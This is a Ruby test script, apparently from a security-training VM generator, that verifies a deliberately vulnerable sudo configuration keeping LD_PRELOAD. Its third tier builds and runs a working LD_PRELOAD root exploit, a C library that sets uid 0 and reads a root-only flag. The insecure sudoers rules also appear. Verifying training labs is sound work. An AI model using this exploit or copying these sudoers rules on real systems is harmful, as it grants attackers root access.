require_relative '../../../../../lib/post_provision_test'


class SudoEnvKeepLdPreloadTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_env_keep_ld_preload'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # Inputs: leaked_filenames and strings_to_leak are both checked below.
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('env_keep default keeps LD_PRELOAD',
                         'cat /etc/sudoers.d/10_ld_preload_env_keep', 'Defaults env_keep += "LD_PRELOAD"')
      test_local_command('sudoers rule allows the status script as root with no password',
                         'cat /etc/sudoers.d/10_ld_preload_status_script',
                         'ALL  ALL=(root) NOPASSWD: /usr/local/bin/system_status')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_ld_preload_sudo_list', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')
      test_local_command('sudoers configuration passes visudo -c', 'visudo -c 2>&1', 'parsed OK')
      test_local_command('status script root-owned and executable',
                         "stat -c '%U:%G %a' /usr/local/bin/system_status", 'root:root 755')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # what a student sees (sudo prints the list value unquoted): sudo -l lists LD_PRELOAD as a kept variable and the allowed command
      test_local_command('unprivileged user sees LD_PRELOAD kept by sudo', 'sudo -n -l', 'env_keep+=LD_PRELOAD', user: 'nobody')
      test_local_command('unprivileged user sees the allowed root command', 'sudo -n -l', '/usr/local/bin/system_status', user: 'nobody')
      test_command_succeeds('unprivileged user runs the status script as root',
                            'sudo -n /usr/local/bin/system_status', user: 'nobody')
      # the flag is not readable without escalating
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_command_succeeds("unprivileged user cannot read leaked #{fname} directly",
                              "! cat #{Shellwords.escape("/root/#{fname}")} 2>/dev/null", user: 'nobody')
      end
    end

    # Tier 3: GTFOBins "sudo" LD_PRELOAD technique (https://gtfobins.github.io/gtfobins/sudo/).
    # sudo keeps LD_PRELOAD (env_keep), so the allowed root command loads an attacker
    # library whose constructor runs as root. Proven as a disposable unprivileged
    # account (not baked into the image), reading the root-only flag to confirm root.
    tier(3) do
      idx    = strings.index { |s| !s.strip.empty? }
      fname  = idx && leaked[idx]
      secret = idx && strings[idx]
      if fname.nil? || secret.nil? || secret.strip.empty?
        skip_check('tier 3 LD_PRELOAD privesc', 'no leaked flag/string configured to prove a root read', tier: 3)
      else
        lib_path = '/tmp/secgen_t3_preload.so'
        # build_sentinel gives a fresh-nonce, world-readable proof file command that
        # records id + hostname + the flag contents; we run it from inside the library.
        sentinel, sent_cmd = build_sentinel("cat /root/#{Shellwords.escape(fname)}")
        csrc = <<~C
          #include <stdlib.h>
          #include <unistd.h>
          __attribute__((constructor)) void secgen_t3(void){
            unsetenv("LD_PRELOAD"); setgid(0); setuid(0);
            system(#{c_string(sent_cmd)});
          }
        C
        with_throwaway_ssh_user do |user, _pass|
          if !compile_preload(csrc, lib_path)
            skip_check('tier 3 LD_PRELOAD privesc',
                       'no C compiler on the target or the attacker to build the preload library', tier: 3)
          else
            # sudo keeps the inline LD_PRELOAD and re-exports it to the root command.
            expl = run_as_user(user, "LD_PRELOAD=#{lib_path} sudo -n /usr/local/bin/system_status")
            body = read_sentinel(sentinel)
            if body.empty? || !sentinel_pwned?(body)
              fail_check('tier 3 LD_PRELOAD privesc',
                         "exploit left no sentinel (sudo output: #{(expl[:stdout].to_s + expl[:stderr].to_s).strip[0, 200]})",
                         tier: 3)
            elsif body !~ /uid=0\(/
              fail_check('tier 3 LD_PRELOAD privesc',
                         "command ran but not as root (<privilege>=root_rwx): #{body[/uid=\S+/]}", tier: 3)
            elsif !body.include?(secret)
              fail_check('tier 3 LD_PRELOAD privesc',
                         "ran as root (#{body[/uid=\S+/]}) but did not read /root/#{fname}", tier: 3)
            else
              pass_check('tier 3 LD_PRELOAD privesc',
                         "unprivileged #{user} escalated via sudo env_keep LD_PRELOAD to #{body[/uid=\S+/]} and read /root/#{fname}", tier: 3)
            end
            run_vagrant_ssh("rm -f #{lib_path} #{sentinel}")
          end
        end
      end
    end
  end

  private

  # A C string literal for `s`, backslash-escaping backslashes and double quotes.
  def c_string(s)
    "\"#{s.gsub(/[\\"]/) { |ch| "\\#{ch}" }}\""
  end

  # Build the LD_PRELOAD shared library at lib_path (world-readable) on the target.
  # Prefer the target's own compiler; if the base has none, compile on the Kali
  # attacker and copy the .so across (the symbols used are old enough to load on
  # Debian 12). Returns true on success.
  def compile_preload(csrc, lib_path)
    src_b64 = Base64.strict_encode64(csrc)
    have_cc = run_vagrant_ssh('command -v cc gcc 2>/dev/null | head -1')[:stdout].to_s.strip
    unless have_cc.empty?
      build = "echo #{src_b64} | base64 -d > /tmp/secgen_t3.c && " \
              "#{have_cc} -fPIC -shared -o #{lib_path} /tmp/secgen_t3.c && chmod 644 #{lib_path}; rm -f /tmp/secgen_t3.c"
      r = run_vagrant_ssh(build, timeout: 120)
      return true if r[:exit_status] == 0
      add_evidence('target_compile', "echo #{Shellwords.escape(r[:stderr].to_s)}")
    end
    atk = attack_system
    return false unless atk
    acc = run_on_system(atk, 'command -v cc gcc 2>/dev/null | head -1')[:stdout].to_s.strip
    return false if acc.empty?
    abuild = "echo #{src_b64} | base64 -d > /tmp/secgen_t3.c && " \
             "#{acc} -fPIC -shared -o /tmp/secgen_t3.so /tmp/secgen_t3.c && base64 -w0 /tmp/secgen_t3.so; " \
             "rm -f /tmp/secgen_t3.c /tmp/secgen_t3.so"
    so_b64 = run_on_system(atk, abuild, timeout: 180)[:stdout].to_s.strip
    return false if so_b64.empty?
    r = run_vagrant_ssh("echo #{so_b64} | base64 -d > #{lib_path} && chmod 644 #{lib_path}", timeout: 60)
    r[:exit_status] == 0
  end

end

SudoEnvKeepLdPreloadTest.new.run
